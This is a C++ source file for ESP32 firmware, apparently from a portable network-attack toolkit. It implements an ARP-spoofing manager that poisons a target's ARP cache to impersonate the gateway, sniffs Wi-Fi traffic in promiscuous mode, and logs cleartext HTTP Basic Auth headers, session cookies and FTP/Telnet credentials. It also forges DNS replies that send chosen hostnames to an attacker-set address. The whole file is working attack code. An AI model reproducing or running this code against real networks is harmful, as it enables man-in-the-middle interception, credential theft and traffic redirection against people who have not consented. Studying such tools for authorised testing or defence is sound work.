#include "ArpSpoofManager.h"
#include "ArpResolver.h"
#include "PingSweep.h"
#include "ScanManager.h"
#include "../net/RawFrame.h"
#include "../net/DnsWire.h"
#include "../net/Ieee80211Frame.h"
#include "../net/WifiManager.h"
#include "../core/Config.h"
#include <WiFi.h>
#include <Preferences.h>
#include <esp_wifi.h>
#include <cstring>

ArpSpoofManager g_arpSpoofManager;

namespace {
constexpr uint16_t kEtherArp = 0x0806;
constexpr uint16_t kEtherIpv4 = 0x0800;

// Simple byte-range substring search — deliberately not relying on the
// buffer being null-terminated (it's a raw captured frame, not a C
// string) or on memmem() being available in this toolchain.
bool containsAscii(const uint8_t* buf, uint16_t len, const char* needle) {
    size_t needleLen = strlen(needle);
    if (needleLen == 0 || len < needleLen) return false;
    for (uint16_t i = 0; i + needleLen <= len; i++) {
        if (memcmp(buf + i, needle, needleLen) == 0) return true;
    }
    return false;
}

uint16_t ipChecksum(const uint8_t* data, uint16_t len) {
    uint32_t sum = 0;
    for (uint16_t i = 0; i + 1 < len; i += 2) sum += ((uint16_t)data[i] << 8) | data[i + 1];
    if (len & 1) sum += (uint16_t)data[len - 1] << 8;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)~sum;
}

// Pending DNS spoof handoff from the promiscuous RX callback (WiFi
// driver task context) to ArpSpoofManager::run() (this manager's own
// task) — see the RISK note in the header on why the actual raw send
// happens on the "normal" side of this boundary, not inside the
// callback itself. Single-slot by design: if two spoofable queries
// arrive within one run()-loop poll window, only the most recent
// survives — acceptable for what's meant as a best-effort demo, not a
// production DNS server.
struct PendingDnsReply {
    bool pending = false;
    uint8_t query[512];
    uint16_t queryLen = 0;
    uint8_t requesterMac[6] = {0};
    IPAddress requesterIp;
    uint16_t requesterPort = 0;
    IPAddress spoofedAnswer;
};
PendingDnsReply g_pendingDns;
SemaphoreHandle_t g_pendingDnsMutex = nullptr;

constexpr const char* kDnsSpoofNamespace = "dnsspoof";
String dnsSpoofKey(uint8_t index, const char* field) { return String(field) + String(index); }

}  // namespace

// --- DnsSpoofList -----------------------------------------------------

uint8_t DnsSpoofList::count() {
    Preferences prefs;
    if (!prefs.begin(kDnsSpoofNamespace, /*readOnly=*/true)) return 0;
    uint8_t n = prefs.getUChar("count", 0);
    prefs.end();
    return (n > kMaxEntries) ? kMaxEntries : n;
}

String DnsSpoofList::hostname(uint8_t index) {
    if (index >= count()) return "";
    Preferences prefs;
    if (!prefs.begin(kDnsSpoofNamespace, /*readOnly=*/true)) return "";
    String h = prefs.getString(dnsSpoofKey(index, "h").c_str(), "");
    prefs.end();
    return h;
}

IPAddress DnsSpoofList::answer(uint8_t index) {
    if (index >= count()) return IPAddress();
    Preferences prefs;
    if (!prefs.begin(kDnsSpoofNamespace, /*readOnly=*/true)) return IPAddress();
    uint32_t raw = prefs.getUInt(dnsSpoofKey(index, "a").c_str(), 0);
    prefs.end();
    return IPAddress(raw);
}

bool DnsSpoofList::add(const String& host, const IPAddress& ip) {
    if (host.isEmpty()) return false;
    uint8_t n = count();
    if (n >= kMaxEntries) return false;

    Preferences prefs;
    if (!prefs.begin(kDnsSpoofNamespace, /*readOnly=*/false)) return false;
    prefs.putString(dnsSpoofKey(n, "h").c_str(), host);
    prefs.putUInt(dnsSpoofKey(n, "a").c_str(), (uint32_t)ip);
    prefs.putUChar("count", (uint8_t)(n + 1));
    prefs.end();
    return true;
}

void DnsSpoofList::remove(uint8_t index) {
    uint8_t n = count();
    if (index >= n) return;

    Preferences prefs;
    if (!prefs.begin(kDnsSpoofNamespace, /*readOnly=*/false)) return;

    String hosts[kMaxEntries];
    uint32_t ips[kMaxEntries];
    for (uint8_t i = 0; i < n; i++) {
        hosts[i] = prefs.getString(dnsSpoofKey(i, "h").c_str(), "");
        ips[i] = prefs.getUInt(dnsSpoofKey(i, "a").c_str(), 0);
    }

    uint8_t newN = 0;
    for (uint8_t i = 0; i < n; i++) {
        if (i == index) continue;
        prefs.putString(dnsSpoofKey(newN, "h").c_str(), hosts[i]);
        prefs.putUInt(dnsSpoofKey(newN, "a").c_str(), ips[i]);
        newN++;
    }
    prefs.remove(dnsSpoofKey(n - 1, "h").c_str());
    prefs.remove(dnsSpoofKey(n - 1, "a").c_str());
    prefs.putUChar("count", newN);
    prefs.end();
}

// --- ArpSpoofManager ----------------------------------------------------

void ArpSpoofManager::begin(QueueHandle_t outQueue) {
    _mutex = xSemaphoreCreateMutex();
    g_pendingDnsMutex = xSemaphoreCreateMutex();
    _outQueue = outQueue;
}

bool ArpSpoofManager::start(const IPAddress& target, uint16_t durationS, bool sniffTraffic) {
    if (_running) return false;

    HostInfo h;
    if (!g_scanManager.getHostByIp(target, h) || !h.macKnown) return false;  // run NETWORK SCAN first

    IPAddress gw = g_wifi.gatewayIP();
    PingSweep::probe(gw, 300);  // forces lwIP to resolve the gateway's MAC as a side effect, if it hasn't already
    uint8_t gwMac[6];
    if (!ArpResolver::lookupMac(gw, gwMac)) return false;

    uint8_t selfMac[6];
    WiFi.macAddress(selfMac);

    _target = target;
    memcpy(_targetMac, h.mac, 6);
    _gateway = gw;
    memcpy(_gatewayMac, gwMac, 6);
    memcpy(_selfMac, selfMac, 6);

    if (durationS > kMaxDurationS) durationS = kMaxDurationS;
    _durationMs = (uint32_t)durationS * 1000;
    _sniffTraffic = sniffTraffic;
    _poisonSent = 0;

    if (xSemaphoreTake(_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
        _log.clear();
        xSemaphoreGive(_mutex);
    }

    _startMs = millis();
    _running = true;
    notify(ScanEventType::ScanStarted);
    // Larger stack than most other managers' worker tasks: maybeSpoofDns()
    // builds a full Ethernet+IP+UDP+DNS frame in on-stack buffers
    // (~1.3KB) - see that function.
    xTaskCreatePinnedToCore(&ArpSpoofManager::taskEntry, "arpspoof", 8192, this, 1, nullptr, 0);
    return true;
}

void ArpSpoofManager::taskEntry(void* arg) {
    static_cast<ArpSpoofManager*>(arg)->run();
    vTaskDelete(nullptr);
}

void ArpSpoofManager::run() {
    log("ARP spoof started: target " + _target.toString() + ", claiming gw " + _gateway.toString());

    if (_sniffTraffic) {
        esp_wifi_set_promiscuous_rx_cb(&ArpSpoofManager::promiscuousRxTrampoline);
        esp_wifi_set_promiscuous(true);
        log("promiscuous capture on (open-network traffic + this target's misdirected frames)");
    }

    uint32_t lastPoison = 0;
    while (_running && (millis() - _startMs) < _durationMs) {
        uint32_t now = millis();
        if (now - lastPoison >= kPoisonIntervalMs) {
            if (sendArpReply(_targetMac, _target, _gateway, _selfMac)) _poisonSent++;
            lastPoison = now;
        }

        // Drain any DNS spoof reply queued up by the promiscuous
        // callback — see PendingDnsReply's comment for why the actual
        // send happens here, not inside that callback.
        if (xSemaphoreTake(g_pendingDnsMutex, pdMS_TO_TICKS(20)) == pdTRUE) {
            if (g_pendingDns.pending) {
                g_pendingDns.pending = false;
                maybeSpoofDns(g_pendingDns.query, g_pendingDns.queryLen, g_pendingDns.requesterIp,
                              g_pendingDns.requesterMac, g_pendingDns.requesterPort);
            }
            xSemaphoreGive(g_pendingDnsMutex);
        }

        vTaskDelay(pdMS_TO_TICKS(50));
    }

    if (_sniffTraffic) {
        esp_wifi_set_promiscuous(false);
    }

    restoreTarget();
    _running = false;
    notify(ScanEventType::ScanFinished, 100);
}

bool ArpSpoofManager::sendArpReply(const uint8_t dstMac[6], const IPAddress& dstIp, const IPAddress& claimedIp,
                                    const uint8_t claimedMac[6]) {
    uint8_t frame[42];
    memcpy(frame + 0, dstMac, 6);
    memcpy(frame + 6, claimedMac, 6);  // src MAC = whoever we're claiming to be (always our own real MAC)
    frame[12] = (uint8_t)(kEtherArp >> 8);
    frame[13] = (uint8_t)(kEtherArp & 0xFF);

    frame[14] = 0x00;
    frame[15] = 0x01;  // htype = Ethernet
    frame[16] = 0x08;
    frame[17] = 0x00;  // ptype = IPv4
    frame[18] = 6;     // hlen
    frame[19] = 4;      // plen
    frame[20] = 0x00;
    frame[21] = 0x02;  // oper = reply
    memcpy(frame + 22, claimedMac, 6);
    uint32_t claimedIpRaw = (uint32_t)claimedIp;
    memcpy(frame + 28, &claimedIpRaw, 4);
    memcpy(frame + 32, dstMac, 6);
    uint32_t dstIpRaw = (uint32_t)dstIp;
    memcpy(frame + 38, &dstIpRaw, 4);

    return RawFrame::send(frame, sizeof(frame));
}

void ArpSpoofManager::restoreTarget() {
    // Un-poison: tell the target the truth again (gateway IP really is
    // at the gateway's real MAC) — sent a few times since UDP-style
    // "fire and forget" ARP has no delivery guarantee, and this is the
    // one send in this whole class that actually matters landing.
    for (int i = 0; i < 3; i++) {
        sendArpReply(_targetMac, _target, _gateway, _gatewayMac);
        delay(100);
    }
    log("ARP spoof stopped, target's cache restored");
}

void ArpSpoofManager::stop() {
    _running = false;  // run() notices, restores, and exits on its own
}

void ArpSpoofManager::promiscuousRxTrampoline(void* buf, wifi_promiscuous_pkt_type_t type) {
    // Real build failure (see git log): the parameter type here MUST be
    // exactly wifi_promiscuous_pkt_type_t, not int - a C function
    // pointer's signature has to match precisely for
    // esp_wifi_set_promiscuous_rx_cb() to accept it. Fixing that also
    // meant switching the filter below to the named enum constant
    // instead of a guessed magic number (originally assumed
    // WIFI_PKT_DATA == 3) - the real esp-idf ordering has it at 2, so
    // that guess would have been a second, silent bug layered under the
    // first: a wrong filter, not a compile error.
    if (type != WIFI_PKT_DATA) return;
    auto* pkt = static_cast<wifi_promiscuous_pkt_t*>(buf);
    if (!pkt) return;
    g_arpSpoofManager.onPromiscuousFrame(pkt->payload, pkt->rx_ctrl.sig_len);
}

void ArpSpoofManager::onPromiscuousFrame(const uint8_t* p, uint16_t len) {
    // 802.11 MAC header parsing lives in net/Ieee80211Frame.h now,
    // shared with CdpLldpSniffer/PmkidManager/RogueDhcpDetector — see
    // its header for why this whole class of parsing fails closed
    // (bounds-checked, silently returns on anything unexpected) instead
    // of assuming success.
    ieee80211::ParsedDataFrame frame;
    if (!ieee80211::parseDataFrame(p, len, frame)) return;

    if (frame.protectedFrame) {
        // Encrypted (WPA2/WPA3) content - nothing readable here without
        // the session key. Still worth a log line if this looks like it
        // came from our poisoned target, as evidence the poisoning
        // reached it at the 802.11 layer even though we can't read it.
        if (_running && memcmp(frame.srcMac, _targetMac, 6) == 0) {
            log("target->\"gateway\" frame seen (encrypted, network is WPA2/3 - content not readable)");
        }
        return;
    }

    uint8_t oui[3];
    uint16_t protocolId, payloadOffset;
    if (!ieee80211::parseSnap(p, len, frame.payloadOffset, oui, protocolId, payloadOffset)) return;
    bool standardOui = (oui[0] == 0 && oui[1] == 0 && oui[2] == 0);
    if (!standardOui || protocolId != kEtherIpv4) return;  // only IPv4 handled - no ARP/IPv6 content analysis here

    analyzeFrame(p, payloadOffset, len, frame.srcMac);
}

void ArpSpoofManager::analyzeFrame(const uint8_t* p, uint16_t ipOffset, uint16_t len, const uint8_t srcMac[6]) {
    if ((uint16_t)(ipOffset + 20) > len) return;
    const uint8_t* ip = p + ipOffset;

    uint8_t verIhl = ip[0];
    if ((verIhl >> 4) != 4) return;  // IPv4 only
    uint8_t ihl = (verIhl & 0x0F) * 4;
    if (ihl < 20 || (uint16_t)(ipOffset + ihl) > len) return;

    uint8_t protocol = ip[9];
    IPAddress srcIp(ip[12], ip[13], ip[14], ip[15]);
    IPAddress dstIp(ip[16], ip[17], ip[18], ip[19]);

    uint16_t l4Offset = ipOffset + ihl;
    uint16_t l4Len = (l4Offset < len) ? (len - l4Offset) : 0;
    if (l4Len == 0) return;
    const uint8_t* l4 = p + l4Offset;

    bool fromTarget = _running && memcmp(srcMac, _targetMac, 6) == 0;

    if (protocol == 17 && l4Len >= 8) {  // UDP
        uint16_t srcPort = ((uint16_t)l4[0] << 8) | l4[1];
        uint16_t dstPort = ((uint16_t)l4[2] << 8) | l4[3];
        if (dstPort == 53 && l4Len > 8) {
            // Only worth reacting to DNS queries that are either from
            // this session's poisoned target, or from anyone at all when
            // not actively spoofing a specific target (open-network
            // sniffing mode) - queue for run() to actually decide/send.
            if (xSemaphoreTake(g_pendingDnsMutex, 0) == pdTRUE) {
                if (!g_pendingDns.pending) {
                    uint16_t qLen = l4Len - 8;
                    if (qLen > sizeof(g_pendingDns.query)) qLen = sizeof(g_pendingDns.query);
                    memcpy(g_pendingDns.query, l4 + 8, qLen);
                    g_pendingDns.queryLen = qLen;
                    memcpy(g_pendingDns.requesterMac, srcMac, 6);
                    g_pendingDns.requesterIp = srcIp;
                    g_pendingDns.requesterPort = srcPort;
                    g_pendingDns.pending = true;
                }
                xSemaphoreGive(g_pendingDnsMutex);
            }
        }
    } else if (protocol == 6 && l4Len >= 20) {  // TCP
        uint16_t dstPort = ((uint16_t)l4[2] << 8) | l4[3];
        uint16_t srcPort = ((uint16_t)l4[0] << 8) | l4[1];
        bool interesting = (dstPort == 80 || srcPort == 80 || dstPort == 21 || srcPort == 21 ||
                             dstPort == 23 || srcPort == 23);
        if (!interesting) return;

        // Deliberately NOT computing the exact TCP payload start byte-
        // precisely (data offset field math on top of already-uncertain
        // header parsing) - scanning the whole remaining captured range
        // for these ASCII markers finds them wherever they actually sit,
        // tolerating an imprecise boundary instead of requiring an exact
        // one. Cleartext only reaches here at all because encrypted
        // frames were already filtered out above.
        const char* hit = nullptr;
        if (containsAscii(l4, l4Len, "Authorization: Basic")) hit = "HTTP Basic Auth header";
        else if (containsAscii(l4, l4Len, "Cookie:")) hit = "HTTP session cookie";
        else if (containsAscii(l4, l4Len, "USER ")) hit = "FTP USER command";
        else if (containsAscii(l4, l4Len, "PASS ")) hit = "FTP/Telnet PASS";

        if (hit) {
            String who = fromTarget ? "target" : macToString(srcMac);
            log(who + " -> " + dstIp.toString() + ":" + String(dstPort) + " leaked " + hit);
        }
    }
}

void ArpSpoofManager::maybeSpoofDns(const uint8_t* q, uint16_t qLen, const IPAddress& requesterIp,
                                     const uint8_t requesterMac[6], uint16_t requesterPort) {
    if (qLen < 12) return;
    if (q[2] & 0x80) return;  // this is a response, not a query - not ours to answer
    uint16_t qdcount = ((uint16_t)q[4] << 8) | q[5];
    if (qdcount == 0) return;

    String host = dnswire::decodeName(q, qLen, 12);
    if (host.isEmpty()) return;
    host.toLowerCase();

    uint8_t n = DnsSpoofList::count();
    IPAddress spoofIp;
    bool matched = false;
    for (uint8_t i = 0; i < n; i++) {
        String candidate = DnsSpoofList::hostname(i);
        candidate.toLowerCase();
        if (candidate == host) {
            spoofIp = DnsSpoofList::answer(i);
            matched = true;
            break;
        }
    }
    if (!matched) return;

    int qEnd = dnswire::skipName(q, qLen, 12);
    if (qEnd < 0 || (uint16_t)(qEnd + 4) > qLen) return;
    uint16_t questionSectionEnd = (uint16_t)(qEnd + 4);

    // DNS message: echo the original header+question verbatim (flipped
    // to a response), append one A-record answer via a compression
    // pointer back to the question's own name (offset 12) rather than
    // re-encoding it.
    uint8_t dns[600];
    if (questionSectionEnd + 16 > sizeof(dns)) return;
    memcpy(dns, q, questionSectionEnd);
    dns[2] |= 0x80;    // QR = 1 (response)
    dns[3] = 0x80;     // RA = 1, RCODE = 0
    dns[6] = 0x00;
    dns[7] = 0x01;     // ANCOUNT = 1
    dns[8] = dns[9] = dns[10] = dns[11] = 0x00;  // NSCOUNT/ARCOUNT = 0

    uint16_t off = questionSectionEnd;
    dns[off++] = 0xC0;
    dns[off++] = 0x0C;  // name = pointer to offset 12
    dns[off++] = 0x00;
    dns[off++] = 0x01;  // TYPE = A
    dns[off++] = 0x00;
    dns[off++] = 0x01;  // CLASS = IN
    dns[off++] = 0x00;
    dns[off++] = 0x00;
    dns[off++] = 0x00;
    dns[off++] = 0x3C;  // TTL = 60s
    dns[off++] = 0x00;
    dns[off++] = 0x04;  // RDLENGTH = 4
    dns[off++] = spoofIp[0];
    dns[off++] = spoofIp[1];
    dns[off++] = spoofIp[2];
    dns[off++] = spoofIp[3];
    uint16_t dnsLen = off;

    // Ethernet + IPv4 + UDP + DNS, hand-assembled - see sendArpReply()
    // for the (much simpler) ARP equivalent of this same pattern.
    uint8_t frame[14 + 20 + 8 + sizeof(dns)];
    uint16_t udpLen = 8 + dnsLen;
    uint16_t totalLen = 20 + udpLen;

    memcpy(frame + 0, requesterMac, 6);
    memcpy(frame + 6, _selfMac, 6);
    frame[12] = 0x08;
    frame[13] = 0x00;  // IPv4

    uint8_t* ip = frame + 14;
    ip[0] = 0x45;  // version 4, IHL 5
    ip[1] = 0x00;
    ip[2] = (uint8_t)(totalLen >> 8);
    ip[3] = (uint8_t)(totalLen & 0xFF);
    ip[4] = 0x00;
    ip[5] = 0x00;  // id
    ip[6] = 0x00;
    ip[7] = 0x00;  // flags/fragment
    ip[8] = 64;    // TTL
    ip[9] = 17;    // UDP
    ip[10] = 0x00;
    ip[11] = 0x00;  // checksum, filled below
    uint32_t gwRaw = (uint32_t)_gateway;  // impersonating the real DNS server (== gateway on most small networks)
    memcpy(ip + 12, &gwRaw, 4);
    uint32_t reqRaw = (uint32_t)requesterIp;
    memcpy(ip + 16, &reqRaw, 4);
    uint16_t ipCsum = ipChecksum(ip, 20);
    ip[10] = (uint8_t)(ipCsum >> 8);
    ip[11] = (uint8_t)(ipCsum & 0xFF);

    uint8_t* udp = ip + 20;
    udp[0] = 0x00;
    udp[1] = 53;  // src port 53
    udp[2] = (uint8_t)(requesterPort >> 8);
    udp[3] = (uint8_t)(requesterPort & 0xFF);
    udp[4] = (uint8_t)(udpLen >> 8);
    udp[5] = (uint8_t)(udpLen & 0xFF);
    udp[6] = 0x00;
    udp[7] = 0x00;  // checksum = 0 (optional over IPv4, RFC 768)
    memcpy(udp + 8, dns, dnsLen);

    if (RawFrame::send(frame, 14 + 20 + udpLen)) {
        log("DNS spoof: " + host + " -> " + spoofIp.toString() + " (to " + requesterIp.toString() + ")");
    }
}

void ArpSpoofManager::log(const String& text) {
    if (xSemaphoreTake(_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
        LogEntry e;
        e.text = text;
        e.atMs = millis();
        if (_log.size() >= kMaxLogEntries) _log.erase(_log.begin());
        _log.push_back(e);
        xSemaphoreGive(_mutex);
    }
    notify(text);
}

void ArpSpoofManager::notify(const String& text) {
    if (!_outQueue) return;
    ScanNotification n;
    n.source = ScanSource::ArpSpoof;
    n.type = ScanEventType::LogLine;
    n.setText(text.c_str());
    xQueueSend(_outQueue, &n, 0);
}

void ArpSpoofManager::notify(ScanEventType type, uint8_t pct) {
    if (!_outQueue) return;
    ScanNotification n;
    n.source = ScanSource::ArpSpoof;
    n.type = type;
    n.progressPct = pct;
    xQueueSend(_outQueue, &n, 0);
}

uint32_t ArpSpoofManager::secondsRemaining() const {
    if (!_running) return 0;
    uint32_t elapsed = millis() - _startMs;
    if (elapsed >= _durationMs) return 0;
    return (_durationMs - elapsed) / 1000;
}

size_t ArpSpoofManager::logCount() const {
    if (!_mutex || xSemaphoreTake(_mutex, pdMS_TO_TICKS(100)) != pdTRUE) return 0;
    size_t n = _log.size();
    xSemaphoreGive(_mutex);
    return n;
}

bool ArpSpoofManager::getLogEntry(size_t index, LogEntry& out) const {
    if (!_mutex || xSemaphoreTake(_mutex, pdMS_TO_TICKS(100)) != pdTRUE) return false;
    bool ok = index < _log.size();
    if (ok) out = _log[_log.size() - 1 - index];
    xSemaphoreGive(_mutex);
    return ok;
}
